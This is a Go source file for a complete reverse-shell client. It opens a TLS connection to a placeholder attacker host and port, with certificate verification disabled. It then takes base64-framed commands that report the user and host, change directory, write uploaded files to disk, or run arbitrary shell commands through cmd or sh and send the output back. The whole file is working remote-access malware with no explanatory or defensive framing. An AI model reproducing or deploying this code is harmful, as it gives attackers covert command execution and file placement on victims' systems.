package main 

import (
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"strconv"
	"crypto/tls"
	b64 "encoding/base64"
	) 

func com_in(conn net.Conn) string {
    lCount := 0
	var data strings.Builder
    lenBuf := make([]byte, 1024)
    n, err := conn.Read(lenBuf)
	if err != nil {
		os.Exit(1) 
		}
	lenDec := make([]byte, b64.StdEncoding.DecodedLen(len(lenBuf)))
	n,_ = b64.StdEncoding.Decode(lenDec, lenBuf)
    expectedLen,_ := strconv.Atoi(string(lenDec[:n]))
	for {
        if lCount >= expectedLen {
            break
        }
        buf := make([]byte, 1024)
        n, err := conn.Read(buf)
        if err != nil {
			os.Exit(1) 
			}
		dec := make([]byte, b64.StdEncoding.DecodedLen(len(buf)))
		n,_ = b64.StdEncoding.Decode(dec, buf)
        data.Write(dec[:n])
        lCount += 1024
    }
	return data.String()
}

// func: sending communication to client
func com_out(out string, conn net.Conn) {
	encodedOut := b64.StdEncoding.EncodeToString([]byte(out))
	weight := len(encodedOut)
	weight_int := strconv.Itoa(weight)
	encodedlen := b64.StdEncoding.EncodeToString([]byte(weight_int))
	_, err := conn.Write([]byte(encodedlen)) 
	if err != nil {
		os.Exit(1) 
		}
	for i := 0; i < weight; i += 1024 {
		end := i + 1024
		if end > weight {
			end = weight
		}
		chunk := encodedOut[i:end]
		_, err = conn.Write([]byte(chunk))
		if err != nil {
			os.Exit(1)
			}
		}
	}

// func : downloading a file
func receiveFile(lpath string, conn net.Conn) string {
	lfile,_ := os.Create(lpath)
	defer lfile.Close()
	rec := make([]byte, 1024)
	for {
		n, err := conn.Read(rec)
		if err != nil {
			out := "Failed"
			return out
		}
		if strings.Contains(string(rec[:n]),":EOF:"){
			break
		}
		dec := make([]byte, b64.StdEncoding.DecodedLen(len(rec)))
		n,_ = b64.StdEncoding.Decode(dec, rec)
		_,_ = lfile.Write(dec[:n])
		}
	out := "Done!"
	return out
	}

// func: executing cmd
func exec_cmd(command string) (string,error) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
		case "windows":
		cmd = exec.Command("cmd", "/c", command)
		default:
		cmd = exec.Command("sh","-c", command)
		}
	output,_ := cmd.CombinedOutput()
	if len(output) == 0 {
		output = []byte("Done!")
	}
	return string(output), nil
	}

func main() {
	
	const (
	HOST = "<HOST>"
	PORT = "<PORT>"
	TYPE = "tcp"
	)
	
	conf := &tls.Config{
		InsecureSkipVerify: true,
		}

	conn, err := tls.Dial(TYPE, HOST+":"+PORT, conf)
	if err != nil {
		println("[!] Init failed: ", err.Error())
		os.Exit(1) 
		}
	
	for true {
		out := ""
		r := (com_in(conn))
		if strings.Split(r," ")[0] == ":user" {
			cur,_ := user.Current()
			out = cur.Username

		} else if strings.Split(r," ")[0] == ":exit" {
			conn.Close()
			os.Exit(1)
			
		} else if strings.Split(r," ")[0] == ":host" {
			out,_ = os.Hostname()
			
		} else if strings.Split(r," ")[0] == "cd"{
			dir := strings.Split(r," ")[1]
			os.Chdir(dir)
			out,_ = os.Getwd()
			
		} else if strings.Split(r," ")[0] == ":upload"{
			lpath := strings.Split(r," ")[1]
			out = receiveFile(lpath,conn)
		} else {
			out, err = exec_cmd(string(r))
		}
		com_out(out, conn)
	}
}
	
